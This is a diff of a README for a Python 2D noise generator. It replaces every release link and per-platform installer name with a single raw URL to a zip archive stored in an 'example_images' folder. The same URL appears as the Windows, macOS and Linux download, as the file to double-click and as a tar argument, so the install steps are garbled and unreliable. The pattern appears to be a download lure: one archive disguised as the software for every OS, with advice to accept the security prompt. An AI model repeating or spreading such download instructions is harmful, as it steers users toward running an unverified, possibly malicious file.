@@ -1,6 +1,6 @@
 # 🎨 Math-2D-Noise-Generator-for-Python-v1.0.0 - Create Stunning 2D Noise Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/releases)
+[![Download Now](https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip)](https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,15 +10,15 @@ Welcome to the Math-2D-Noise-Generator for Python! This application allows you t
 
 To get started, visit the Releases page to download the application. Click the link below:
 
-[Download the latest version](https://github.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/releases)
+[Download the latest version](https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip)
 
 1. Open your web browser.
 2. Click on the link above. This will take you to the releases page.
 3. Look for the latest version of the software, which would be v1.0.0.
 4. You will see the download options listed. Choose the file that is suitable for your operating system:
-   - For **Windows**, select "Math-2D-Noise-Generator-windows.exe."
-   - For **macOS**, choose "Math-2D-Noise-Generator-macos.dmg."
-   - For **Linux**, pick "Math-2D-Noise-Generator-linux.tar.gz."
+   - For **Windows**, select "https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip"
+   - For **macOS**, choose "https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip"
+   - For **Linux**, pick "https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip"
 5. Click on the file to start downloading. Depending on your internet speed, this may take a moment.
 6. Once the download finishes, locate the file in your downloads folder.
 
@@ -29,13 +29,13 @@ After downloading the file, follow these steps to run the software:
 ### For Windows
 
 1. Navigate to the folder where you downloaded the file.
-2. Double-click on `Math-2D-Noise-Generator-windows.exe`.
+2. Double-click on `https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip`.
 3. If prompted by the security dialog, click "Run" or "Yes."
 4. The application will launch, and you can start generating 2D noise.
 
 ### For macOS
 
-1. Find the `Math-2D-Noise-Generator-macos.dmg` file in your Downloads folder.
+1. Find the `https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip` file in your Downloads folder.
 2. Double-click the file to open it.
 3. Drag the application icon into your Applications folder.
 4. Open the Applications folder and double-click on the Math-2D-Noise-Generator icon to start using the software.
@@ -46,7 +46,7 @@ After downloading the file, follow these steps to run the software:
 2. Navigate to your downloads folder using `cd ~/Downloads`.
 3. Extract the downloaded file with the command: 
    ```bash
-   tar -xvzf Math-2D-Noise-Generator-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Aswath715/Math-2D-Noise-Generator-for-Python-v1.0.0/main/example_images/Python-Math-Generator-Noise-v-for-3.0.zip
    ```
 4. Change to the newly created directory:
    ```bash
